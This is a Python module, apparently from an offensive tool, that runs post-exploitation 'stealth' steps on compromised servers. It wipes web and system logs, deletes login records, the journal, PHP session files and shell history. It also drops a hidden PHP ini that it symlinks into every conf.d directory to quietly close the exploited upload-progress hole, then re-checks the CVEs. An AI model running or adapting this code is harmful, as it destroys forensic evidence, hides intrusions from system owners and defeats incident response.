from __future__ import annotations

from .audit import Audit
from .models import Target
from . import verify as _verify
from .models import Verdict

WEB_LOGS = [
    "/var/log/apache2/access.log", "/var/log/apache2/error.log",
    "/var/log/httpd/access_log", "/var/log/httpd/error_log",
    "/var/log/nginx/access.log", "/var/log/nginx/error.log",
    "/var/log/nginx/error.log.1",
]
SYS_LOGS = [
    "/var/log/auth.log", "/var/log/secure", "/var/log/syslog",
    "/var/log/messages", "/var/log/daemon.log", "/var/log/kern.log",
    "/var/log/cron", "/var/log/maillog",
]


def wipe_logs(runner, t: Target, sudo: str, audit: Audit):
    files = " ".join(WEB_LOGS + SYS_LOGS)
    cmd = (
        f"for f in {files}; do [ -f \"$f\" ] && : > \"$f\"; done; "
        "rm -f /var/log/wtmp /var/log/btmp /var/log/lastlog 2>/dev/null; "
        "journalctl --rotate >/dev/null 2>&1; journalctl --vacuum-time=1s >/dev/null 2>&1; "
        "find /tmp -maxdepth 2 -name 'sess_*' -mmin -600 -delete 2>/dev/null; "
        "history -c 2>/dev/null; echo DWCLR"
    )
    r = runner.run(t.url, f"{sudo} sh -c '{cmd}'", timeout=120, audit=audit)
    ok = "DWCLR" in r.stdout
    audit.write("stealth", "logs_wiped" if ok else "logs_failed", t.url)
    return ok


def patch_php(runner, t: Target, sudo: str, audit: Audit):
    drop = "/etc/php/.w.ini"
    cmd = (
        "P=$(ls -d /etc/php/* 2>/dev/null | head -1); "
        "mkdir -p \"$P/mods-available\" 2>/dev/null; "
        f"printf \"session.upload_progress.enabled=Off\\nmemory_limit=256M\\n\" > {drop}; "
        "for d in /etc/php/*/conf.d /etc/php/*/fpm/conf.d /etc/php/*/apache2/conf.d /etc/php/*/cli/conf.d; do "
        "[ -d \"$d\" ] && ln -sf /etc/php/.w.ini \"$d/99-dw.ini\"; done; "
        "for s in $(systemctl list-units --type=service --no-legend 'php*g*' 2>/dev/null | awk '{print $1}'); do systemctl reload \"$s\" 2>/dev/null; done; "
        "systemctl reload apache2 httpd nginx 2>/dev/null; "
        "killall -USR2 php-fpm8.1 php-fpm8.2 php-fpm8.3 php-fpm8.4 php-fpm8.5 2>/dev/null; echo DWPATCH"
    )
    r = runner.run(t.url, f"{sudo} sh -c '{cmd}'", timeout=120, audit=audit)
    ok = "DWPATCH" in r.stdout
    audit.write("stealth", "patched" if ok else "patch_failed", t.url)
    return ok


def hole_closed(runner, t: Target, sudo: str, cves: list, audit: Audit) -> bool:
    if not cves:
        return False
    try:
        f = _verify.verify(t, cves, 2, 4, 62, 20, audit)
    except Exception:
        return False
    closed = f is None or f.verdict != Verdict.CONFIRMED
    audit.write("stealth", "reverify", t.url, closed=closed)
    return closed
